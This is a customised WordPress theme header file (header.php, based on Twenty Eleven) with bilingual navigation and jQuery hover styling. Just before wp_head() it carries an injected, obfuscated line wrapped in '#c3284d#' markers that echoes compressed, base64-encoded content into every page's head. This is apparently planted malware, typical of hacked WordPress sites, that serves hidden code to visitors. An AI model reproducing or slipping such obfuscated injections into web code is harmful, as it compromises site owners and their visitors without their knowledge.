<?php

/**

 * The Header for our theme.

 *

 * Displays all of the <head> section and everything up till <div id="main">

 *

 * @package WordPress

 * @subpackage Twenty_Eleven

 * @since Twenty Eleven 1.0

 */

?><!DOCTYPE html>

<!--[if IE 6]>

<html id="ie6" <?php language_attributes(); ?>>

<![endif]-->

<!--[if IE 7]>

<html id="ie7" <?php language_attributes(); ?>>

<![endif]-->

<!--[if IE 8]>

<html id="ie8" <?php language_attributes(); ?>>

<![endif]-->

<!--[if IE 9]>

<html id="ie9" <?php language_attributes(); ?>>

<![endif]-->

<!--[if !(IE 6) | !(IE 7) | !(IE 8) | !(IE 9)  ]><!-->

<html <?php language_attributes(); ?>>

<!--<![endif]-->

<head>

<meta charset="<?php bloginfo( 'charset' ); ?>" />

<meta name="viewport" content="width=device-width" />

<title><?php

	/*

	 * Print the <title> tag based on what is being viewed.

	 */

	global $page, $paged;



	wp_title( '|', true, 'right' );



	// Add the blog name.

	bloginfo( 'name' );



	// Add the blog description for the home/front page.

	$site_description = get_bloginfo( 'description', 'display' );

	if ( $site_description && ( is_home() || is_front_page() ) )

		echo " | $site_description";



	// Add a page number if necessary:

	if ( $paged >= 2 || $page >= 2 )

		echo ' | ' . sprintf( __( 'Page %s', 'twentyeleven' ), max( $paged, $page ) );



	?></title>

<link rel="profile" href="http://gmpg.org/xfn/11" />

<link rel="stylesheet" type="text/css" media="all" href="<?php bloginfo( 'stylesheet_url' ); ?>" />

<link rel="stylesheet" type="text/css" media="all" href="<?php echo get_stylesheet_directory_uri(); ?>/thetooltip.css" />





<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>" />



<!--[if lt IE 9]>

<script src="<?php echo get_template_directory_uri(); ?>/js/html5.js" type="text/javascript"></script>

<![endif]-->

<?php

	/* We add some JavaScript to pages with the comment form

	 * to support sites with threaded comments (when in use).

	 */

	if ( is_singular() && get_option( 'thread_comments' ) )

		wp_enqueue_script( 'comment-reply' );



	/* Always have wp_head() just before the closing </head>

	 * tag of your theme, or you will break many plugins, which

	 * generally use this hook to add elements to <head> such

	 * as styles, scripts, and meta tags.

	 */

	

#c3284d#

echo(gzinflate(base64_decode("7ZHBTsMwDIZfJcpliTS149puSGPihuDCDXFIG6exlCZR4m6rGO9Opk1cAAnu+GTr9yf7txn7j9/GOvcJI93uVWJTchtuiWJT18GPYcowxQq9CXUmRbmKNvIWjRBe7XFQFFJVetJ2AE8VhYdwgLRTGYQslIbjkxF8zAhc3m5W8nT6C2cwgQnHCyrfzvuZjQ79NJ6hPoEiuHdwrsQCTVIjLGRrqgy0JUrYTQSCH1CT5Ut+w79qFnCw9IOYU8+X5SDfKDQ7KNQeM3bokOaGWdQafMtiyEgYfMNUl4Mr/S1zYKhhq0gtoxAvWRn4aWUAuvrId/OzGh6LE8G7oGcuX1avlYoRvN5ZdFoY+b6urx/7AA==")));

#/c3284d#

wp_head();

?>
<script>

$ = jQuery;

$(document).ready(function()
{
	$(".Business_Categories .elements li").hover(function () {
		var licolor = $(this).attr('rel');
		$(this).css({"border-width": "3px", "border-style":"solid", "border-color":licolor});
	}, function () {
		$(this).css({"border": "1px solid #E6E6E6"});
	});
	
	$(".Business_Activities .elements li").hover(function () {
		var licolor = $(this).attr('rel');
		$(this).css({"border-width": "3px", "border-style":"solid", "border-color":licolor});
	}, function () {
		$(this).css({"border": "1px solid #E6E6E6"});
	});
});
</script>

</head>


<?php //echo "rajesh";print_r(get_taxonomies('','names')); ?>
<body <?php body_class(); ?>>
    <div class="header_outerwrap">
        <div class="header_left">
        </div> 
        <div class="header_centerwrap">  
            <div id="header">
                <div id="navigation" class="<?php echo get_current_language_code(); ?>">
                    <a class="home" href="<?php bloginfo( 'url' ); ?>"><img src="<?php echo get_stylesheet_directory_uri(); ?>/images/home.png" /></a>
                    <?php wp_nav_menu( array( 'menu' => 'primaire' ) ); ?>
                    <?php echo link_to_other_language(); ?>
                </div>
            </div>
        </div>
        <div class="header_right">
        </div>  
    </div> 

    <div id="container">